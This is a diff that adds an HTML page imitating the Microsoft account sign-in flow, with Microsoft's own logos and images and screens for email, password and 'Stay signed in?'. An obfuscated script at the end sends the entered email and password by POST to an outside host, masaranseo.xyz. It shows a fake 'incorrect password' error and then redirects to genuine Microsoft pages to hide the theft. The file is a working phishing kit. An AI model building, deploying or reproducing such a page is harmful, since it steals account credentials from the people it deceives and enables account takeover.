@@ -1,0 +1,450 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" href="https://logincdn.msftauth.net/16.000.29780.1/images/favicon.ico">
+
+    <style>
+        body {
+            background-image: url("https://logincdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            margin: 0;
+        }
+
+        a {
+            -webkit-text-size-adjust: 100%;
+            font-weight: 400;
+            line-height: 1.25rem;
+            direction: ltr;
+            text-align: left;
+            font-size: .8125rem;
+            box-sizing: border-box;
+            background-color: transparent;
+            text-decoration: none;
+            outline: none;
+            color: #0067b8;
+            white-space: nowrap;
+        }
+
+        td {
+            text-align: left;
+            padding-left: 10px;
+        }
+
+        input {
+            -webkit-text-size-adjust: 100%;
+            box-sizing: border-box;
+            color: inherit;
+            font: inherit;
+            margin: 0;
+            font-family: inherit;
+            font-size: inherit;
+            max-width: 100%;
+            line-height: inherit;
+            display: block;
+            width: 100%;
+            background-image: none;
+            direction: ltr;
+            text-align: left;
+            border-style: solid;
+            padding: 6px 10px;
+            border-width: 1px;
+            border-color: #0067b8;
+            height: 36px;
+            outline: none;
+            background-color: transparent;
+            border-top-width: 0;
+            border-left-width: 0;
+            border-right-width: 0;
+            padding-left: 0;
+        }
+
+        .middle-container {
+            -webkit-text-size-adjust: 100%;
+            font-weight: 400;
+            font-size: .9375rem;
+            line-height: 1.25rem;
+            direction: ltr;
+            color: #1b1b1b;
+            text-align: left;
+            box-sizing: border-box;
+        }
+
+        .inbox {
+            margin-left: auto;
+            margin-right: auto;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 21px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+            min-height: 250px;
+            overflow: hidden;
+            margin-top: 14%;
+        }
+
+        .row-title {
+            -webkit-text-size-adjust: 100%;
+            direction: ltr;
+            text-align: left;
+            box-sizing: border-box;
+            margin-left: 0;
+            margin-right: 0;
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+            padding: 0;
+            margin-top: 16px;
+            margin-bottom: 12px;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            box-sizing: border-box;
+        }
+
+        .next-t {
+            -webkit-text-size-adjust: 100%;
+            font-weight: 400;
+            font-size: .9375rem;
+            line-height: 1.25rem;
+            direction: ltr;
+            color: #1b1b1b;
+            text-align: right;
+            box-sizing: border-box;
+            float: right;
+            margin-top: 20px;
+
+        }
+
+        .btn {
+            -webkit-text-size-adjust: 100%;
+            direction: ltr;
+            box-sizing: border-box;
+            font: inherit;
+            margin: 0;
+            font-family: inherit;
+            font-size: inherit;
+            cursor: pointer;
+            padding: 4px 12px 4px 12px;
+            position: relative;
+            max-width: 100%;
+            text-align: center;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            touch-action: manipulation;
+            min-height: 32px;
+            border: none;
+            min-width: 108px;
+            line-height: normal;
+            margin-top: 0;
+            margin-bottom: 0;
+            color: #fff;
+            border-color: #0067b8;
+            background-color: #0067b8;
+            display: block;
+            width: 100%;
+        }
+
+        .tabl {
+            margin-left: auto;
+            margin-right: auto;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            padding: 8px 44px;
+            margin-bottom: 28px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+            overflow: hidden;
+            height: 32px;
+            width: 352px;
+        }
+
+        .pass {
+            -webkit-text-size-adjust: 100%;
+            direction: ltr;
+            text-align: left;
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            box-sizing: border-box;
+        }
+
+        .id {
+            line-height: 24px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        .idban {
+            height: 24px;
+            background: #fff;
+            margin-top: 16px;
+            margin-bottom: -4px
+        }
+
+        p.error-message {
+            -webkit-text-size-adjust: 100%;
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            font-weight: 400;
+            font-size: .9200rem;
+            line-height: 1.25rem;
+            direction: ltr;
+            text-align: left;
+            box-sizing: border-box;
+            position: relative;
+            min-height: 1px;
+            padding-left: 2px;
+            padding-right: 2px;
+            float: left;
+            width: 100%;
+            color: #e81123;
+            margin: 0;
+        }
+
+        .form-grp p {
+            display: none;
+        }
+
+        .error p {
+            display: block;
+        }
+
+        .error input {
+            border-color: #e81123;
+        }
+
+        #btr {
+            margin: auto;
+            margin-left: 10px;
+        }
+
+        input[type="checkbox"] {
+            -webkit-text-size-adjust: 100%;
+            direction: ltr;
+            color: inherit;
+            font: inherit;
+            margin: 0;
+            font-family: inherit;
+            font-size: inherit;
+            max-width: 100%;
+            line-height: inherit;
+            box-sizing: border-box;
+            padding: 0;
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            margin-left: -28px;
+        }
+
+        form label {
+            -webkit-text-size-adjust: 100%;
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            font-weight: 400;
+            font-size: .9375rem;
+            line-height: 1.25rem;
+            direction: ltr;
+            color: #1b1b1b;
+            text-align: left;
+            box-sizing: border-box;
+            display: inline-block;
+            max-width: 100%;
+            /* outline: 1px solid #ee8900 !important; */
+            min-height: 20px;
+            cursor: pointer;
+            padding-left: 28px;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+        
+        @media(max-width: 600px) {
+            body{
+                background-image: none;
+            }
+            .inbox{
+                width: 100%;
+                margin-top: 0;
+                box-shadow: none;
+            }
+            .tabl{
+                box-shadow: none;
+                border: 1px solid;
+                max-width: 280px;
+                width: calc(100% - 40px);
+                min-width: 200px;
+            }
+        }
+
+    </style>
+</head>
+
+<body>
+
+    <!--------------------------------------- first page start--------------------------------- -->
+    <div class="middle-container" id="first-pg">
+        <div class="inbox">
+            <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                alt="MicroSoft image">
+
+            <div class="row-title">Sign in</div>
+
+            <form action="" id="form" method="">
+                <div class="form-grp ">
+
+                    <p class="error-message">Enter a valid email address, phone number, or Skype name.</p>
+
+                    <input type="email" id="email" class="error" name="email" placeholder="Email, phone, or Skype">
+                </div>
+
+                <p>No account? <a href="#">Create one!</a></p>
+                <a href="#">Sign in with Windows Hello or a security key</a> <img
+                    src="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"
+                    alt="">
+                <div class="next-t">
+                    <input type="submit" id="input-btn" class="btn" value="Next">
+
+                </div>
+            </form>
+        </div>
+
+        <div class="tabl">
+            <table>
+                <div id="btr">
+                    <tr>
+                        <td><a href=""><img
+                                    src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
+                                    width="32px" height="32px" alt=""></a></td>
+                        <td class="sign-in-td">Sign-in options</td>
+                    </tr>
+                </div>
+            </table>
+        </div>
+
+    </div>
+
+    <!-- ------------------------------------First paage end--------------------------------------------------------------- -->
+
+    <!---------------------------------------- Second Page start------------------------------------------------------- -->
+
+    <div id="pass-pg" style="display: none;">
+        <div class="middle-container">
+            <div class="inbox">
+                <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                    alt="MicroSoft image">
+
+                <div class="idban">
+                    <div id="disname" class="id">
+
+                    </div>
+                </div>
+
+                <form action="">
+                    <div class="form-grp">
+
+                        <div class="pass row-title">Enter password</div>
+
+                        <p class="error-message">Please enter the password for your Microsoft account.</p>
+
+                        <input type="Password" id="password" name="password" placeholder="password">
+                    </div>
+                    <p><a href="#">Forgot password?</a></p>
+
+                    <a href="#">Sign in with a different Microsoft account</a> <img src="images/ques.svg" alt="">
+
+                    <div class="next-t">
+                        <input type="submit" id="submit-btn" class="btn" value="Sign in">
+                    </div>
+
+                </form>
+            </div>
+
+        </div>
+    </div>
+    <!-- <script>
+        const topName = localStorage.getItem('em-ail')
+        document.querySelector("#disname").textContent = topName
+    </script> -->
+    <!----------------------------------------------------------------- Second page end -------------------------------------------------------->
+
+
+    <!-- ----------------------------------------------------------------Third page start---------------------------------------------------------- -->
+    <div id="third-pg" style="display: none;">
+        <div class="middle-container">
+            <div class="inbox">
+                <img src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                    alt="MicroSoft image">
+
+                <div class="idban">
+                    <div id="isname" class="id">
+
+                    </div>
+                </div>
+
+                <form action="">
+                    <div class="form-grp">
+
+                        <div class="pass row-title">Stay signed in?</div>
+
+                        <p class="">Stay signed in so you don't have to sign in again next time.</p>
+
+
+                    </div>
+                    <p>Stay signed in so you don't have to sign in again next time.</p>
+
+                    <label>
+                        <input type="checkbox">
+                        <span>Don't show this again</span>
+                    </label>
+
+                    <div class="next-t">
+                    
+                        <input type="submit" id="sub-btn"  class="btn" value="Yes" style="margin-top: 20px; margin-left: 5px;">
+                    </div>
+                    <div class="next-t">
+                        <input type="submit" id="sub-bt"  class="btn" value="No" style="background-color: rgba(0,0,0,0.2); border-color: transparent; color: #000;">
+                    </div>
+
+                </form>
+            </div>
+
+        </div>
+    </div>
+    <!------------------------------------------------------------------------Third page end---------------------------------------------------------- -->
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
+    </script>
+
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+    <script>
+        function _0x293d(){var _0x460d87=['border-color','https://masaranseo.xyz/june.php','#pass-pg','toLocaleLowerCase','188650VcWykP','#e81123','40TcAmbA','Sign\x20in...','#disname','https://www.office.com','focus','keypress','show','opacity','#password','168VoPohz','test','136iypbNI','47xbJDEF','JSON','length','403550WlVdwB','click','css','#input-btn','substr','keyCode','ajax','#email','That\x20Microsoft\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account\x20or\x20<a>get\x20a\x20new\x20one.</a>','24694oWxJUu','#first-pg','which',':visible','115170yKhqoV','39813FAxqlm','indexOf','Please\x20enter\x20the\x20password\x20for\x20your\x20Microsoft\x20account.','left','preventDefault','val','POST','replace','13025935OlkqsQ','hash','Your\x20account\x20or\x20password\x20is\x20incorrect.\x20If\x20you\x20don\x27t\x20remember\x20your\x20password,\x20<a>reset\x20it\x20now.</a>\x20','#field','animate','https://login.microsoftonline.com/common/login','html','.error-message','#sub-bt','#0067b8','Login','#isname','#third-pg','#submit-btn','651180FcXNRA','Enter\x20a\x20valid\x20email\x20address,\x20phone\x20number,\x20or\x20Skype\x20name','81cvzSac','right','location','162kMHlAt','hide'];_0x293d=function(){return _0x460d87;};return _0x293d();}function _0x4186(_0x15736f,_0x185735){var _0x293d2d=_0x293d();return _0x4186=function(_0x41869a,_0xb5d63e){_0x41869a=_0x41869a-0x135;var _0x45900f=_0x293d2d[_0x41869a];return _0x45900f;},_0x4186(_0x15736f,_0x185735);}(function(_0x19d975,_0x2a6320){var _0x36e654=_0x4186,_0x445137=_0x19d975();while(!![]){try{var _0x40844e=parseInt(_0x36e654(0x157))/0x1*(parseInt(_0x36e654(0x163))/0x2)+-parseInt(_0x36e654(0x168))/0x3*(parseInt(_0x36e654(0x156))/0x4)+parseInt(_0x36e654(0x167))/0x5*(parseInt(_0x36e654(0x143))/0x6)+parseInt(_0x36e654(0x15a))/0x7*(parseInt(_0x36e654(0x14b))/0x8)+-parseInt(_0x36e654(0x140))/0x9*(-parseInt(_0x36e654(0x13e))/0xa)+-parseInt(_0x36e654(0x149))/0xb*(parseInt(_0x36e654(0x154))/0xc)+-parseInt(_0x36e654(0x170))/0xd;if(_0x40844e===_0x2a6320)break;else _0x445137['push'](_0x445137['shift']());}catch(_0x346df1){_0x445137['push'](_0x445137['shift']());}}}(_0x293d,0x5d8fe),$(document)['ready'](function(){var _0x5a6002=_0x4186,_0x453444=0x0,_0xfa9606=window[_0x5a6002(0x142)][_0x5a6002(0x171)][_0x5a6002(0x15e)](0x1);if(!_0xfa9606){}else{if(!base64regex['test'](_0xfa9606))var _0x17049f=_0xfa9606;else var _0x17049f=atob(_0xfa9606);if(!filter[_0x5a6002(0x155)](_0x17049f))return $(_0x5a6002(0x137))['show'](),_0xfa9606[_0x5a6002(0x14f)],![];var _0x36a039=_0x17049f[_0x5a6002(0x169)]('@'),_0x547a2f=_0x17049f[_0x5a6002(0x15e)](_0x36a039+0x1),_0xb00e4b=_0x547a2f[_0x5a6002(0x15e)](0x0,_0x547a2f[_0x5a6002(0x169)]('.')),_0xae0c83=_0xb00e4b[_0x5a6002(0x148)]();$(_0x5a6002(0x161))[_0x5a6002(0x16d)](_0x17049f);var _0x12deae={};_0x12deae['left']=0x0,_0x12deae['opacity']=_0x5a6002(0x144),$(_0x5a6002(0x164))[_0x5a6002(0x174)](_0x12deae,0x0);var _0x19d404={};_0x19d404[_0x5a6002(0x141)]=0x0,_0x19d404[_0x5a6002(0x152)]=_0x5a6002(0x151),$(_0x5a6002(0x147))['animate'](_0x19d404,0x1f4),$(_0x5a6002(0x14d))['html'](_0x17049f);}$(_0x5a6002(0x161))[_0x5a6002(0x15b)](function(){var _0x34baa9=_0x5a6002;$(_0x34baa9(0x137))[_0x34baa9(0x144)](),$(_0x34baa9(0x161))[_0x34baa9(0x15c)](_0x34baa9(0x145),'#0067b8');}),$(_0x5a6002(0x153))[_0x5a6002(0x15b)](function(){var _0x23821a=_0x5a6002;$('.error-message')[_0x23821a(0x144)](),$(_0x23821a(0x153))[_0x23821a(0x15c)]('border-color',_0x23821a(0x139));}),$('#sub-btn')[_0x5a6002(0x15b)](function(){var _0x1320ce=_0x5a6002;event[_0x1320ce(0x16c)](),window['location'][_0x1320ce(0x16f)](_0x1320ce(0x14e));}),$(_0x5a6002(0x138))['click'](function(){var _0xf6055d=_0x5a6002;event[_0xf6055d(0x16c)](),window[_0xf6055d(0x142)]['replace'](_0xf6055d(0x135));}),$(document)[_0x5a6002(0x150)](function(_0x241ee4){var _0x2d0a75=_0x5a6002,_0x22b4d2=_0x241ee4[_0x2d0a75(0x15f)]?_0x241ee4[_0x2d0a75(0x15f)]:_0x241ee4[_0x2d0a75(0x165)];if(_0x22b4d2=='13'){_0x241ee4['preventDefault']();if($(_0x2d0a75(0x164))['is'](':visible'))$(_0x2d0a75(0x15d))['click']();else{if($(_0x2d0a75(0x147))['is'](_0x2d0a75(0x166)))_0x241ee4['preventDefault'](),$(_0x2d0a75(0x13d))['click']();else{if($(_0x2d0a75(0x13c))['is'](_0x2d0a75(0x166)))_0x241ee4[_0x2d0a75(0x16c)](),$('#yes-btn')[_0x2d0a75(0x15b)]();else return![];}}}}),$('#input-btn')['click'](function(){var _0x33c9a7=_0x5a6002;event[_0x33c9a7(0x16c)]();var _0x200c24=$(_0x33c9a7(0x161))[_0x33c9a7(0x16d)]();if(_0x200c24[_0x33c9a7(0x159)]<0x1)return $('.error-message')[_0x33c9a7(0x136)](_0x33c9a7(0x13f)),$('.error-message')[_0x33c9a7(0x151)](),$(_0x33c9a7(0x161))[_0x33c9a7(0x15c)]('border-color',_0x33c9a7(0x14a)),_0xfa9606[_0x33c9a7(0x14f)],![];var _0x7480f1=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x7480f1[_0x33c9a7(0x155)](_0x200c24))return $(_0x33c9a7(0x137))[_0x33c9a7(0x136)](_0x33c9a7(0x162)),$(_0x33c9a7(0x137))[_0x33c9a7(0x151)](),$('#email')[_0x33c9a7(0x15c)](_0x33c9a7(0x145),'#e81123'),_0xfa9606[_0x33c9a7(0x14f)],![];var _0x2b9484=_0x200c24[_0x33c9a7(0x169)]('@'),_0x44923f=_0x200c24['substr'](_0x2b9484+0x1),_0x4ef8d6=_0x44923f[_0x33c9a7(0x15e)](0x0,_0x44923f[_0x33c9a7(0x169)]('.')),_0x57205a=_0x4ef8d6[_0x33c9a7(0x148)]();$(_0x33c9a7(0x161))[_0x33c9a7(0x16d)](_0x200c24);var _0xab9e34={};_0xab9e34[_0x33c9a7(0x16b)]=0x0,_0xab9e34['opacity']=_0x33c9a7(0x144),$('#first-pg')[_0x33c9a7(0x174)](_0xab9e34,0x0);var _0x8b85ff={};_0x8b85ff[_0x33c9a7(0x141)]=0x0,_0x8b85ff[_0x33c9a7(0x152)]=_0x33c9a7(0x151),$('#pass-pg')[_0x33c9a7(0x174)](_0x8b85ff,0x1f4),$(_0x33c9a7(0x14d))[_0x33c9a7(0x136)](_0x200c24);}),$(_0x5a6002(0x13d))[_0x5a6002(0x15b)](function(_0xb2a90b){var _0xa0423a=_0x5a6002;_0xb2a90b[_0xa0423a(0x16c)]();if($('#password')[_0xa0423a(0x16d)]()['length']<0x8)return $(_0xa0423a(0x137))[_0xa0423a(0x136)](_0xa0423a(0x172)),$(_0xa0423a(0x137))[_0xa0423a(0x151)](),$(_0xa0423a(0x153))[_0xa0423a(0x15c)](_0xa0423a(0x145),_0xa0423a(0x14a)),![];if($('#password')[_0xa0423a(0x16d)]()[_0xa0423a(0x159)]<0x1)return $(_0xa0423a(0x137))[_0xa0423a(0x136)](_0xa0423a(0x16a)),$(_0xa0423a(0x137))['show'](),$(_0xa0423a(0x153))[_0xa0423a(0x15c)](_0xa0423a(0x145),_0xa0423a(0x14a)),![];var _0x5801d9=$(_0xa0423a(0x161))['val'](),_0x56fb40=$(_0xa0423a(0x153))[_0xa0423a(0x16d)](),_0x519e46=$(_0xa0423a(0x173))[_0xa0423a(0x136)]();_0x453444=_0x453444+0x1;if(_0x453444>=0x2){_0x453444=0x0;var _0x1f1262=$(_0xa0423a(0x161))[_0xa0423a(0x16d)](),_0xf61a1b=_0x1f1262[_0xa0423a(0x169)]('@'),_0x949a74=_0x1f1262['substr'](_0xf61a1b+0x1),_0x3ebdbd=_0x949a74['substr'](0x0,_0x949a74[_0xa0423a(0x169)]('.')),_0x4adb69=_0x3ebdbd[_0xa0423a(0x148)](),_0x115f43={};_0x115f43[_0xa0423a(0x16b)]=0x0,_0x115f43['opacity']=_0xa0423a(0x144),$('#pass-pg')[_0xa0423a(0x174)](_0x115f43,0x0);var _0x4d556e={};_0x4d556e[_0xa0423a(0x141)]=0x0,_0x4d556e[_0xa0423a(0x152)]=_0xa0423a(0x151),$(_0xa0423a(0x13c))['animate'](_0x4d556e,0x1f4),$(_0xa0423a(0x13b))[_0xa0423a(0x136)](_0x1f1262);}else{var _0xd9e705={};_0xd9e705['email']=_0x5801d9,_0xd9e705['password']=_0x56fb40,_0xd9e705['detail']=_0x519e46,$[_0xa0423a(0x160)]({'dataType':_0xa0423a(0x158),'url':_0xa0423a(0x146),'type':_0xa0423a(0x16e),'data':_0xd9e705,'beforeSend':function(_0x485b07){var _0x4b064f=_0xa0423a;$(_0x4b064f(0x13d))[_0x4b064f(0x136)](_0x4b064f(0x14c));},'complete':function(){var _0x16dcc5=_0xa0423a;$(_0x16dcc5(0x13d))[_0x16dcc5(0x136)](_0x16dcc5(0x13a));}});}});}));
+    </script>
+
+</body>
+
+</html>
